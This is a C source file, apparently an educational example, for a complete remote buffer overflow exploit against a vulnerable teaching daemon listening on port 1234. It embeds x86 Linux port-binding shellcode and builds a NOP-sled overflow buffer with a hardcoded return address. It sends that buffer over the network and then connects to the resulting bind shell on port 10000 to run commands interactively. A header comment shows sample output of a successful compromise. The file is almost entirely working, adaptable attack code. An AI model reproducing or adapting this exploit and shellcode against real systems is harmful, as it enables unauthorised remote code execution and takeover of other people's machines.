/*
 * $Id: remote1-ex.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * remote1-ex.c - remote1.c exploit (remote exploitation)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Simple remote exploit example. Tested on Linux 2.4.20-rc4 and 2.4.21.
 *
 * raptor@karma:~/devel$ ./remote1-ex localhost 
 * Using ret: 0xbffffa60
 * malicious buffer sent, waiting for shell...
 * 0wned, j00 hax0r! :)
 * Linux karma 2.4.20-rc4 #1 SMP Wed Nov 27 19:21:06 CET 2002 i686 unknown
 * uid=3008(raptor) gid=1000(redazione) groups=1000(redazione)
 * exit
 * raptor@karma:~/devel$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define BUF	1065		// 1024 + 40 + 1
#define NOP	0x90		// nop padding
#define PORT	1234		// vuln daemon listens on this port
#define EX_PORT	10000		// port binded by our shellcode
#define RET	0xbffffa60	// hardcoded value found during tests
#define ALIGN	2		// alignment

char sc[] = /* linux/x86 portbinding shellcode (88 bytes) */
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
"\x89\xc7\x52\x66\x68"
"\x27\x10" // port 10000/tcp, change if needed
"\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
"\xb0\x66\xb3\x04\xcd\x80"
"\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
"\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
"\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80";

/* our resolver function */
u_long resolve(u_char *hostname)
{
	struct in_addr addr;
	struct hostent *host;

	if ( (addr.s_addr = inet_addr(hostname)) == -1 ) {
		if ( !(host = gethostbyname(hostname)) )
			return(0);
		memcpy((char *)&addr.s_addr, host->h_addr, host->h_length);
	}

	return(addr.s_addr);
}

/* connect() to the port binded by our shellcode */
void owned(u_long dst)
{
	struct sockaddr_in sin;
	u_char sock_buf[4096];
	fd_set fds;
	int s;
	char *cmd = "/bin/uname -a; /usr/bin/id\n";

	/* open a socket */
	if ( (s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0 ) {
		perror("socket");
		exit(-1);
	}
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(EX_PORT);

	/* connect to the bindshell */
	if (connect(s, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0) {
		perror("connect");
		close(s);
		exit(-1);
	}

	/* vuln daemon owned */
	fprintf(stderr, "0wned, j00 hax0r! :)\n");
	send(s, cmd, strlen(cmd), 0);

	for (;;) {
		FD_ZERO(&fds);
		FD_SET(0, &fds);	/* stdin */
		FD_SET(s, &fds);

		if ( select(255, &fds, NULL, NULL, NULL) < 0 ) {
			perror("select");
			close(s);
			exit(-1);
		}

		memset(sock_buf, 0, sizeof(sock_buf));

		if (FD_ISSET(s, &fds)) {
			if ( recv(s, sock_buf, sizeof(sock_buf), 0) < 0 ) {
				fprintf(stderr, "lost connection\n");
				close(s);
				exit(0);
			}
			fprintf(stderr, "%s", sock_buf);
		}

		if (FD_ISSET(0, &fds)) {
			read(0, sock_buf, sizeof(sock_buf));
			write(s, sock_buf, strlen(sock_buf));
		}
	}
}

int main(int argc, char *argv[])
{
	char buf[BUF];
	int i, n, s;
	int *p;
	struct sockaddr_in rmt;
	int port = PORT;
	u_long dst = 0;

	if (argc < 2) {
		fprintf(stderr, "usage: %s <target> [<port>]\n", argv[0]);
		return (-1);
	}

	fprintf(stderr, "Using ret: %p\n", RET);

	/* resolve the target host */
	if ( !(dst = resolve(argv[1])) ) {
		fprintf(stderr, "can't resolve hostname %s\n", argv[1]);
		exit(-1);
	}

	if (argc > 2)
		port = atoi(argv[2]);

	/* padding and alignment */
	memset(buf, 'A', BUF);
	p = (int *)(buf + ALIGN);

	/* fill the buffer with ret */
	for (i = 0; i < BUF - 1; i += 4)
		*p++ = RET;
	*p = 0x0;

	/* nop padding */
	for (i = 0; i < (BUF - 1) / 2; i++)
		buf[i] = NOP;

	/* place shellcode after the nops */
	for (n = 0; n < strlen(sc); n++)
		buf[i++] = sc[n];

	/* open a socket */
	if ( (s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		perror("socket");
		exit(-1);
	}
	rmt.sin_family = AF_INET;
	rmt.sin_addr.s_addr = dst;
	rmt.sin_port = htons(port);

	/* connect to the vuln daemon */
	if (connect(s, (struct sockaddr *)&rmt, sizeof(struct sockaddr)) < 0) {
		perror("connect");
		close(s);
		exit(-1);
	}

	/* send the malicious payload */
	if ( send(s, buf, sizeof(buf), 0) < 0 ) {
		perror("send");
		close(s);
		exit(-1);
	}

	fprintf(stderr, "malicious buffer sent, waiting for shell...\n");
	sleep(4);

	close(s);

	/* now, go and own it! */
	owned(dst);
}
